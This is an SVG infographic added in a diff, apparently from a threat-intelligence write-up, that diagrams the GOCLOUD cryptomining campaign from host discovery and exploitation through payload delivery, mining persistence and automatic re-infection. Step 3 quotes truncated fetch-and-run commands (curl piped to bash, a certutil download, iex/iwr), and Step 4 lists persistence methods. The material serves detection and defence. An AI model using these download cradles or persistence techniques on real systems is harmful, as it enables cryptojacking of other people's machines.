@@ -1,0 +1,99 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif">
+  <!--
+    GOCLOUD targeting-to-mining pipeline. Layout family: vertical-chain, 5 steps.
+    Step 5 is the self-healing loop that feeds back into step 2.
+  -->
+  <defs>
+    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#cccccc"/>
+    </marker>
+    <filter id="cardShadow" x="-2%" y="-2%" width="104%" height="108%">
+      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/>
+    </filter>
+  </defs>
+
+  <rect width="1000" height="1700" fill="#161616"/>
+  <rect x="0.5" y="0.5" width="999" height="1699" fill="none" stroke="#2a2a2a" stroke-width="1"/>
+
+  <!-- =========== TITLE =========== -->
+  <text x="500" y="62" text-anchor="middle" font-size="40" font-weight="700" fill="#ffffff">The GOCLOUD Pipeline</text>
+  <text x="500" y="106" text-anchor="middle" font-size="24" fill="#f5f5f5">Discovery to mining, and the loop that re-infects dead hosts</text>
+  <text x="500" y="140" text-anchor="middle" font-size="18" fill="#cccccc">An hourly cron orchestrator drives the whole cycle; most of it never landed</text>
+  <line x1="60" y1="166" x2="940" y2="166" stroke="#2a2a2a" stroke-width="1"/>
+
+  <!-- =========== STEP 1 — ORANGE, discovery / access =========== -->
+  <g filter="url(#cardShadow)">
+    <rect x="60" y="196" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
+    <rect x="60" y="196" width="880" height="46" rx="8" fill="#f97316"/>
+    <rect x="60" y="229" width="880" height="13" fill="#f97316"/>
+    <text x="80" y="227" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 1</text>
+    <text x="200" y="227" font-size="23" font-weight="600" fill="#111111">Discover</text>
+    <text x="80" y="282" font-size="21" fill="#ffffff">Query a commercial asset-search platform every three minutes</text>
+    <text x="80" y="316" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">27 service classes, every query scoped country="CN"</text>
+    <text x="80" y="350" font-size="18" fill="#e5e5e5">Matches are appended to a hit file and deduped against hosts already owned</text>
+    <text x="80" y="384" font-size="18" fill="#fb923c" font-weight="600">Selection is by exposed product, never by industry or victim</text>
+  </g>
+  <line x1="500" y1="416" x2="500" y2="456" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <!-- =========== STEP 2 — RED, operator code / exploitation =========== -->
+  <g filter="url(#cardShadow)">
+    <rect x="60" y="462" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
+    <rect x="60" y="462" width="880" height="46" rx="8" fill="#dc2626"/>
+    <rect x="60" y="495" width="880" height="13" fill="#dc2626"/>
+    <text x="80" y="493" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 2</text>
+    <text x="200" y="493" font-size="23" font-weight="600" fill="#ffffff">Exploit</text>
+    <text x="80" y="548" font-size="21" fill="#ffffff">A central dispatcher fires a per-service technique at each target</text>
+    <text x="80" y="582" font-size="17" fill="#e5e5e5">Default credentials, or an N-day with a public proof-of-concept. No original research.</text>
+    <text x="80" y="616" font-size="18" fill="#e5e5e5">Most per-service functions return success without ever confirming execution</text>
+    <text x="80" y="650" font-size="18" fill="#fb923c" font-weight="600">This is the step where claimed reach detaches from real compromise</text>
+  </g>
+  <line x1="500" y1="682" x2="500" y2="722" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <!-- =========== STEP 3 — YELLOW, payload retrieval =========== -->
+  <g filter="url(#cardShadow)">
+    <rect x="60" y="728" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
+    <rect x="60" y="728" width="880" height="46" rx="8" fill="#eab308"/>
+    <rect x="60" y="761" width="880" height="13" fill="#eab308"/>
+    <text x="80" y="759" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STEP 3</text>
+    <text x="200" y="759" font-size="23" font-weight="600" fill="#111111">Deliver</text>
+    <text x="80" y="814" font-size="21" fill="#ffffff">One line fetches and runs the payload from the single payload host</text>
+    <text x="80" y="848" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">curl .../miner.sh|bash  ·  certutil .../deploy.bat  ·  iex (iwr .../allinone.ps1)</text>
+    <text x="80" y="882" font-size="18" fill="#e5e5e5">Raw IP throughout. No domain, no fallback host, anywhere in either toolkit.</text>
+    <text x="80" y="916" font-size="18" fill="#fb923c" font-weight="600">That single host is the operation's disruption lever</text>
+  </g>
+  <line x1="500" y1="948" x2="500" y2="988" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <!-- =========== STEP 4 — DEEP RED, endgame / persistence =========== -->
+  <g filter="url(#cardShadow)">
+    <rect x="60" y="994" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
+    <rect x="60" y="994" width="880" height="46" rx="8" fill="#7f1d1d"/>
+    <rect x="60" y="1027" width="880" height="13" fill="#7f1d1d"/>
+    <text x="80" y="1025" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 4</text>
+    <text x="200" y="1025" font-size="23" font-weight="600" fill="#ffffff">Mine and persist</text>
+    <text x="80" y="1080" font-size="21" fill="#ffffff">Stock XMRig runs to a public pool, each worker labelled by its origin</text>
+    <text x="80" y="1114" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">systemd unit + @reboot cron (Linux)  ·  scheduled task + Run key (Windows)</text>
+    <text x="80" y="1148" font-size="18" fill="#fb923c" font-weight="600">svchost.exe running outside System32 · task named WinJenkinsHeartbeat</text>
+    <text x="80" y="1180" font-size="18" fill="#fb923c" font-weight="600">The Windows branch mines to a checksum-invalid address and earns nothing</text>
+  </g>
+  <line x1="500" y1="1214" x2="500" y2="1254" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <!-- =========== STEP 5 — RED, operator code / self-healing loop =========== -->
+  <g filter="url(#cardShadow)">
+    <rect x="60" y="1260" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
+    <rect x="60" y="1260" width="880" height="46" rx="8" fill="#dc2626"/>
+    <rect x="60" y="1293" width="880" height="13" fill="#dc2626"/>
+    <text x="80" y="1291" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STEP 5</text>
+    <text x="200" y="1291" font-size="23" font-weight="600" fill="#ffffff">Self-heal, then back to Step 2</text>
+    <text x="80" y="1346" font-size="21" fill="#ffffff">A standalone daemon watches the operator's own panel for workers that died</text>
+    <text x="80" y="1380" font-size="18" fill="#e5e5e5">For each dead host it looks up the vulnerability that worked the first time,</text>
+    <text x="80" y="1408" font-size="18" fill="#e5e5e5">then calls the same exploit function again, with no operator involvement</text>
+    <text x="80" y="1444" font-size="18" fill="#fb923c" font-weight="600">Re-infection of a cleaned host is designed behaviour here, not an anomaly</text>
+  </g>
+
+  <!-- =========== FOOTER =========== -->
+  <line x1="60" y1="1520" x2="940" y2="1520" stroke="#2a2a2a" stroke-width="1"/>
+  <text x="500" y="1554" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">Detection anchors:  miner delivery one-liner piped to a shell  ·  certutil download cradle</text>
+  <text x="500" y="1584" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">svchost.exe outside System32  ·  startup task beaconing the machine name</text>
+  <text x="500" y="1620" text-anchor="middle" font-size="15" fill="#cccccc">Remediation that does not also close the original exposure will be undone by Step 5.</text>
+  <text x="500" y="1652" text-anchor="middle" font-size="14" fill="#888888">Legend: orange = discovery · red = operator code · yellow = payload retrieval · deep red = mining and persistence</text>
+</svg>
